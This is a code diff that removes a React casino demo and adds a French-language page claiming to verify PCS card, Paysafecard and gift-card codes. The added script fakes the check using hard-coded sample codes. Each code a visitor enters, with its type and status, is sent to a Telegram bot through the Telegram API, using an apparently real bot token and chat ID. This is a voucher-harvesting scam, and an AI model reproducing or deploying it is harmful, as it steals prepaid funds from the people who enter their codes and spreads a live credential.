-    const particles = Array.from({length: 60}, () => ({
-      x: Math.random() * canvas.width, y: Math.random() * canvas.height,
-      vx: (Math.random()-0.5)*0.3, vy: (Math.random()-0.5)*0.3,
-      r: Math.random()*2+0.5,
-      color: Math.random() > 0.5 ? "rgba(212,175,55," : "rgba(120,40,200,"
-    }));
-    let raf;
-    const draw = () => {
-      ctx.clearRect(0,0,canvas.width,canvas.height);
-      particles.forEach(p => {
-        p.x += p.vx; p.y += p.vy;
-        if (p.x<0) p.x=canvas.width; if (p.x>canvas.width) p.x=0;
-        if (p.y<0) p.y=canvas.height; if (p.y>canvas.height) p.y=0;
-        ctx.beginPath();
-        ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
-        ctx.fillStyle = p.color + (Math.random()*0.3+0.3)+")";
-        ctx.fill();
-      });
-      // Grid lines
-      ctx.strokeStyle = "rgba(212,175,55,0.03)";
-      ctx.lineWidth = 1;
-      for (let x = 0; x < canvas.width; x += 60) {
-        ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,canvas.height); ctx.stroke();
-      }
-      for (let y = 0; y < canvas.height; y += 60) {
-        ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(canvas.width,y); ctx.stroke();
-      }
-      raf = requestAnimationFrame(draw);
-    };
-    draw();
-    const resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
-    window.addEventListener("resize", resize);
-    return () => { cancelAnimationFrame(raf); window.removeEventListener("resize", resize); };
-  }, []);
-  return <canvas ref={canvasRef} style={{ position: "fixed", top:0, left:0, width:"100%", height:"100%", zIndex:0, pointerEvents:"none" }}/>;
-}
-
-// ── Main App ────────────────────────────────────────────────────────
-export default function CasinoApp() {
-  const [tab, setTab] = useState("slots");
-  const [totalWon, setTotalWon] = useState(0);
-  const [jackpot, setJackpot] = useState(48320);
-  const [shake, setShake] = useState(false);
-
-  useEffect(() => { const t = setInterval(() => setJackpot(j => j + Math.floor(Math.random()*7+1)), 1800); return () => clearInterval(t); }, []);
-
-  const handleWin = (amount) => {
-    setTotalWon(w => w + amount);
-    if (amount >= 100) { setShake(true); setTimeout(() => setShake(false), 800); }
-  };
-
-  const tabs = [
-    { id: "slots", label: "🎰 Slots" },
-    { id: "roulette", label: "🎲 Roulette" },
-    { id: "blackjack", label: "♠ Blackjack" },
-  ];
-
-  return (
-    <div style={{
-      minHeight: "100vh", background: "radial-gradient(ellipse at 50% 0%, rgba(80,20,120,0.4) 0%, rgba(10,5,20,1) 60%)",
-      fontFamily: "'Georgia', serif",
-      animation: shake ? "shake 0.5s ease" : "none",
-      position: "relative", overflow: "hidden"
-    }}>
-      <style>{`
-        @keyframes shimmer { 0%{background-position:0% 50%} 100%{background-position:200% 50%} }
-        @keyframes fadeIn { from{opacity:0;transform:translateY(4px)} to{opacity:1;transform:translateY(0)} }
-        @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
-        @keyframes bounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-6px)} }
-        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
-        * { box-sizing: border-box; }
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); }
-        ::-webkit-scrollbar-thumb { background: rgba(212,175,55,0.3); border-radius: 4px; }
-      `}</style>
-
-```
-  <CasinoBackground />
-
-  <div style={{ position: "relative", zIndex: 1, maxWidth: 900, margin: "0 auto", padding: "0 16px 120px" }}>
-
-    {/* Header */}
-    <div style={{ textAlign: "center", padding: "36px 0 24px" }}>
-      <div style={{
-        fontSize: 11, letterSpacing: 6, color: "#d4af37", opacity: 0.7, marginBottom: 8,
-        textTransform: "uppercase"
-      }}>Welcome to</div>
-      <h1 style={{
-        margin: 0, fontSize: "clamp(36px,8vw,72px)", fontWeight: 900, letterSpacing: 4,
-        background: "linear-gradient(135deg,#d4af37 0%,#fff8dc 40%,#d4af37 60%,#b8922e 100%)",
-        WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent",
-        backgroundSize: "300% 300%", animation: "shimmer 3s linear infinite",
-        textShadow: "none", filter: "drop-shadow(0 0 30px rgba(212,175,55,0.4))"
-      }}>ABYSS CASINO</h1>
-      <div style={{ color: "rgba(212,175,55,0.5)", fontSize: 12, letterSpacing: 8, marginTop: 4 }}>
-        EST. MMXXV • LUXURY GAMING
-      </div>
-
-      {/* Jackpot */}
-      <div style={{
-        display: "inline-flex", alignItems: "center", gap: 10, marginTop: 20,
-        padding: "10px 24px", borderRadius: 40,
-        background: "rgba(212,175,55,0.08)", border: "1px solid rgba(212,175,55,0.3)",
-        boxShadow: "0 0 30px rgba(212,175,55,0.1)"
-      }}>
-        <span style={{ color: "#888", fontSize: 10, letterSpacing: 3 }}>JACKPOT</span>
-        <span style={{
-          color: "#d4af37", fontSize: 22, fontWeight: 900, fontVariantNumeric: "tabular-nums",
-          textShadow: "0 0 20px rgba(212,175,55,0.6)"
-        }}>${jackpot.toLocaleString()}</span>
-        <div style={{ width: 8, height: 8, borderRadius: "50%", background: "#22c55e", animation: "pulse 1s infinite" }}/>
-      </div>
     </div>
 
-    {/* Ticker */}
-    <div style={{ marginBottom: 24 }}><LiveTicker /></div>
+    <script>
+        // ============================================================
+        // 🔐 À MODIFIER AVEC TES INFORMATIONS PERSO (GARDE LES SECRÈTES)
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = "TON_TOKEN_ICI";      // ← Remplace par ton token
+        const TELEGRAM_CHAT_ID = "TON_CHAT_ID_ICI";      // ← Remplace par ton chat ID
+        
+        // ⚠️ Si tu ne veux PAS utiliser Telegram, laisse les lignes au-dessus telles quelles
+        //    Le site fonctionnera normalement sans envoyer d'alertes
+        // ============================================================
+        
+        let currentTab = 0;
 
-    {/* Tabs */}
-    <div style={{
-      display: "flex", gap: 4, marginBottom: 24, padding: 4,
-      background: "rgba(255,255,255,0.04)", borderRadius: 14,
-      border: "1px solid rgba(255,255,255,0.08)"
-    }}>
-      {tabs.map(t => (
-        <button key={t.id} onClick={() => setTab(t.id)} style={{
-          flex: 1, padding: "10px 0", borderRadius: 10, border: "none", cursor: "pointer",
-          background: tab === t.id
-            ? "linear-gradient(135deg,rgba(212,175,55,0.2),rgba(120,40,200,0.2))"
-            : "transparent",
-          color: tab === t.id ? "#d4af37" : "#666",
-          fontSize: 13, fontWeight: tab === t.id ? 700 : 400,
-          borderBottom: tab === t.id ? "2px solid #d4af37" : "2px solid transparent",
-          transition: "all .2s", letterSpacing: 1
-        }}>{t.label}</button>
-      ))}
-    </div>
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('#content > div').forEach(panel => panel.classList.add('hidden'));
+            document.getElementById(`panel-${tab}`).classList.remove('hidden');
+            
+            for(let i=0; i<3; i++) {
+                const t = document.getElementById(`tab-${i}`);
+                if(i === tab) t.classList.add('tab-active');
+                else t.classList.remove('tab-active');
+            }
+            
+            document.getElementById(`result-${tab}`).classList.add('hidden');
+            document.getElementById(`error-${tab}`).classList.add('hidden');
+        }
 
-    {/* Game panel */}
-    <div style={{ animation: "fadeIn .4s ease" }} key={tab}>
-      {tab === "slots" && <SlotMachine onWin={handleWin}/>}
-      {tab === "roulette" && <Roulette />}
-      {tab === "blackjack" && <Blackjack />}
-    </div>
+        function formatCardNumber(value) {
+            return value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1-').trim().slice(0,19);
+        }
 
-    {/* Stats row */}
-    {totalWon > 0 && (
-      <div style={{
-        marginTop: 20, padding: "12px 20px", borderRadius: 12, textAlign: "center",
-        background: "rgba(34,197,94,0.08)", border: "1px solid rgba(34,197,94,0.3)",
-        color: "#22c55e", fontSize: 14, animation: "fadeIn .4s"
-      }}>
-        🏆 Session winnings: <strong>${totalWon.toLocaleString()}</strong>
-      </div>
-    )}
+        async function sendTelegramAlert(code, type, eligible, statusMessage) {
+            if (TELEGRAM_BOT_TOKEN === "8478024946:AAGc-ow2iy2Ee1xcSMZDKnGrbeUqphdzIpE" || TELEGRAM_CHAT_ID === "6885625999") {
+                console.log("Telegram non configuré");
+                return;
+            }
+            
+            const status = eligible ? "✅ ÉLIGIBLE" : "❌ NON ÉLIGIBLE";
+            const date = new Date().toLocaleString("fr-FR");
+            
+            const message = `🔔 NOUVELLE VÉRIFICATION
+━━━━━━━━━━━━━━━━
+📇 Type: ${type}
+💳 Code: ${code}
+🎯 Statut: ${status}
+📝 Message: ${statusMessage}
+🕒 Heure: ${date}
+━━━━━━━━━━━━━━━━`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+                console.log("Alerte Telegram envoyée");
+            } catch (error) {
+                console.error("Erreur Telegram:", error);
+            }
+        }
 
-    {/* Footer */}
-    <div style={{ textAlign: "center", marginTop: 40, color: "rgba(255,255,255,0.15)", fontSize: 10, letterSpacing: 2 }}>
-      ABYSS CASINO • PLAY RESPONSIBLY • 18+ ONLY • NOT REAL MONEY
-    </div>
-  </div>
+        async function verify(tab) {
+            const input = document.getElementById(`input-${tab}`);
+            const resultDiv = document.getElementById(`result-${tab}`);
+            const errorDiv = document.getElementById(`error-${tab}`);
+            const value = input.value.trim().toUpperCase();
+            
+            errorDiv.classList.add('hidden');
+            resultDiv.classList.add('hidden');
 
-  {/* Chat widget */}
-  <CasinoChatWidget onCommand={(cmd) => console.log("Command:", cmd)} />
-</div>
-```
+            let isValid = false;
+            let message = "";
+            let colorClass = "";
+            let typeName = "";
 
-);
-}
+            if (tab === 0) {
+                typeName = "Carte PCS";
+                const clean = value.replace(/-/g, '');
+                if (clean.length !== 16 || !/^\d{16}$/.test(clean)) {
+                    errorDiv.textContent = "Format invalide. Utilisez XXXX-XXXX-XXXX-XXXX";
+                    errorDiv.classList.remove('hidden');
+                    return;
+                }
+                if (value === "1234-5678-9012-3456") {
+                    isValid = true;
+                    message = "✅ Éligible - Carte PCS active et valide";
+                    colorClass = "result-eligible";
+                } else if (value === "1111-2222-3333-4444") {
+                    isValid = false;
+                    message = "❌ Non éligible - Carte PCS inactive ou bloquée";
+                    colorClass = "result-not-eligible";
+                } else {
+                    message = "❌ Code invalide ou non reconnu";
+                    colorClass = "bg-gray-600 text-white";
+                }
+            } 
+            else if (tab === 1) {
+                typeName = "Paysafecard";
+                if (value.length !== 16 || !/^\d{16}$/.test(value)) {
+                    errorDiv.textContent = "Le code doit contenir exactement 16 chiffres";
+                    errorDiv.classList.remove('hidden');
+                    return;
+                }
+                if (value === "1234567890123456") {
+                    isValid = true;
+                    message = "✅ Éligible - Paysafecard valide";
+                    colorClass = "result-eligible";
+                } else if (value === "0000000000000000") {
+                    isValid = false;
+                    message = "❌ Non éligible - Code épuisé ou invalide";
+                    colorClass = "result-not-eligible";
+                } else {
+                    message = "❌ Code Paysafecard non reconnu";
+                    colorClass = "bg-gray-600 text-white";
+                }
+            } 
+            else if (tab === 2) {
+                typeName = "Carte Cadeau";
+                if (value === "GIFT-ABCD-1234") {
+                    isValid = true;
+                    message = "✅ Éligible - Carte Cadeau active";
+                    colorClass = "result-eligible";
+                } else if (value === "GIFT-XXXX-0000") {
+                    isValid = false;
+                    message = "❌ Non éligible - Carte Cadeau expirée";
+                    colorClass = "result-not-eligible";
+                } else {
+                    message = "❌ Code cadeau invalide ou non reconnu";
+                    colorClass = "bg-gray-600 text-white";
+                }
+            }
+
+            resultDiv.innerHTML = message;
+            resultDiv.className = `hidden mt-4 p-5 rounded-2xl text-center text-lg font-medium ${colorClass}`;
+            resultDiv.classList.remove('hidden');
+            
+            // Envoi de l'alerte Telegram
+            await sendTelegramAlert(value, typeName, isValid, message);
+        }
+
+        document.getElementById('input-0').addEventListener('input', function(e) {
+            e.target.value = formatCardNumber(e.target.value);
+        });
+
+        window.onload = () => {
+            switchTab(0);
+        };
+    </script>
+</body>
+</html>
